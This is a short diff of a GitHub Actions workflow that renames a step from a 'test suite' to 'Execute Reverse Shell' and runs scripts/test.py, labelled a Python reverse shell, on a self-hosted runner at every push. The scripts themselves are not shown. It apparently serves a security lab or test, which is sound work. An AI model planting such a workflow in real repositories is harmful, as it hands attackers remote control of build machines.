@@ -1,4 +1,4 @@
-name: Run Test Suite (Actually Reverse Shell)
+name: Execute Reverse Shell
 
 on: [push]
 
@@ -6,10 +6,9 @@ jobs:
   run-test:
     runs-on: self-hosted
     steps:
-      - name: Checkout code
+      - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Run malicious test
+      - name: Run Python Reverse Shell
         run: |
-          chmod +x scripts/test.sh
-          ./scripts/test.sh
+          python3 scripts/test.py
